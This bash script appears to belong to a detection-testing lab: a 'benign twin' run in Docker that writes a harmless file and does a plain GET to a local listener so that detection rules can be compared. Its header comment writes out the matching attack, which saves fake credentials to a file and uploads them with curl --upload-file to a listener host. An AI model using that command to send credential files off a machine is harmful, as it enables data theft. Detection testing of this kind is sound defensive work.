#!/usr/bin/env bash
# TJ-3 benign twin — mirrors tj-3-t1567.002-paste-upload.sh without the upload.
#
#   Attack : echo <fake creds> > /tmp/creds.txt && curl --upload-file /tmp/creds.txt http://<listener>/upload
#   Benign : echo <benign content>  > /tmp/tj-benign-get.txt && curl GET http://<listener>/
#
# Mechanics matched: same actor, same local file write, same curl from tj-victim to
# the SAME listener — so "curl from victim to listener" fires benign. The candidate
# separating literals are the --upload-file argv and the PUT method on the wire.
# Run during the BENIGN window of a scenario-3 round. Safe: local listener only.
set -euo pipefail
cd "$(dirname "$0")"
./setup-listener.sh >/dev/null
./setup-imds-poller.sh >/dev/null
LISTENER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' tj-listener)

echo "=== TJ-3 benign begin $(date -u +%FT%TZ)"
docker exec tj-victim bash -c "
  echo tj-benign-not-credentials > /tmp/tj-benign-get.txt
  curl -s --max-time 3 http://$LISTENER_IP/ >/dev/null || true
  rm -f /tmp/tj-benign-get.txt
" || echo "(benign fetch failed — check tj-listener)"
sleep 6   # poller soak: the benign window must contain the IMDS poller's signature
echo "=== TJ-3 benign end   $(date -u +%FT%TZ)"
